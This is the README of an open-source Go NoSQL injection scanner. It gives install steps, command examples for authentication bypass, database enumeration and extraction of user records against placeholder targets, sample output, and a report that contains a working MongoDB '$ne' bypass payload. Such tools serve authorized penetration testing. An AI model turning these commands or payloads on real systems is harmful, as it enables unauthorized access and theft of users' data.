# NoSQLi - Advanced NoSQL Injection & Enumeration Tool

A powerful Go-based NoSQL injection scanner that can detect vulnerabilities, perform database enumeration, and extract data from various NoSQL databases.

## 🚀 Features

- 🔍 Automatic NoSQL database type detection
- 💉 Advanced injection techniques (Authentication bypass, Time-based, Error-based)
- 📊 Database enumeration capabilities
- 🗄️ Support for multiple NoSQL databases:
  - MongoDB
  - CouchDB
  - Elasticsearch
  - Firebase
- 📝 Detailed JSON reports
- 🔐 Custom headers and authentication support
- 🎯 Precise targeting with multiple payload types

## 🛠️ Installation

### Option 1: Direct Installation
```bash
# Install directly using Go
go install github.com/Silent-Xploit/NoSQLi@latest
```

### Option 2: Build from Source
```bash
# Clone the repository
git clone https://github.com/Silent-Xploit/NoSQLi.git

# Change directory
cd NoSQLi

# Build the tool
go build -o nosqli
```

## 📚 Usage Guide

### Basic Syntax
```bash
./nosqli --url <target_url> [options]
```

### Common Use Cases

1. Basic Vulnerability Scan:
```bash
./nosqli --url "http://target.com/api/login" \
  --method POST \
  --data '{"username":"admin","password":"test"}'
```

2. Authentication Bypass Attempt:
```bash
./nosqli --url "http://target.com/login" \
  --method POST \
  --data '{"user":"admin","pass":"test"}' \
  --headers '{"Content-Type": "application/json"}'
```

3. Database Enumeration:
```bash
./nosqli --url "http://target.com/api" \
  --enum \
  --enum-type databases
```

4. Extract Data from Collection:
```bash
./nosqli --url "http://target.com/api" \
  --enum \
  --enum-type data \
  --collection users \
  --field "username,email" \
  --limit 10
```

## 🎯 Command Line Flags

### Essential Flags
- `-u, --url` (Required)
  - Target URL to scan
  - Example: `--url "http://target.com/api"`

- `-m, --method`
  - HTTP method to use (GET/POST)
  - Default: Auto-detected based on URL and data
  - Example: `--method POST`

### Authentication & Headers
- `-H, --headers`
  - Custom HTTP headers as JSON string
  - Example: `--headers '{"Authorization": "Bearer token123"}'`

- `-c, --cookies`
  - Cookie string for authenticated requests
  - Example: `--cookies "session=abc123; token=xyz"`

- `-d, --data`
  - POST data as JSON string
  - Example: `--data '{"username":"admin"}'`

### Database Options
- `-t, --db-type`
  - Force specific database type
  - Values: mongodb, couchdb, elasticsearch, firebase
  - Example: `--db-type mongodb`

### Enumeration Flags
- `-e, --enum`
  - Enable database enumeration mode
  - Example: `--enum`

- `--enum-type`
  - Type of enumeration to perform
  - Values: databases, collections, fields, data
  - Example: `--enum-type collections`

- `--collection`
  - Specify collection/table to enumerate
  - Example: `--collection users`

- `--field`
  - Fields to extract (comma-separated)
  - Example: `--field "username,email,role"`

- `--where`
  - Conditions for data extraction (JSON format)
  - Example: `--where '{"role":"admin"}'`

- `--limit`
  - Limit number of results
  - Example: `--limit 10`

## 📊 Example Output

```
    _   __      _____ ____    __    _ 
   / | / /___  / ___// __ \  / /   (_)
  /  |/ / __ \ \__ \/ / / / / /   / / 
 / /|  / /_/ /___/ / /_/ / / /___/ /  
/_/ |_/\____//____/\___\_\/_____/_/   

🔍 Starting NoSQL Injection Scanner
Target: http://target.com/api

✅ Detected database: mongodb
✅ Loaded payloads

📊 Enumeration Results:
Found databases:
- admin
- users
- config

Found collections in 'users':
- accounts
- profiles
- settings

Extracted data from 'accounts':
ID | Username | Email | Role
--------------------------------
1  | admin    | admin@site.com | admin
2  | user1    | user1@site.com | user
```

## 📋 Generated Reports

The tool generates a detailed JSON report containing:
```json
{
  "scan_info": {
    "url": "http://target.com/api",
    "method": "POST",
    "detected_db": "mongodb",
    "timestamp": "2025-05-20T10:30:00Z"
  },
  "vulnerabilities": [
    {
      "type": "Authentication Bypass",
      "payload": {"username": {"$ne": null}},
      "success": true
    }
  ],
  "enumeration": {
    "databases": ["admin", "users"],
    "collections": ["accounts", "profiles"],
    "extracted_data": [
      // Array of extracted records
    ]
  }
}
```

## ⚠️ Security Notice

This tool is for authorized security testing only. Unauthorized testing of systems you don't own or have permission to test is illegal.

## 📜 License

MIT License - See LICENSE file for details
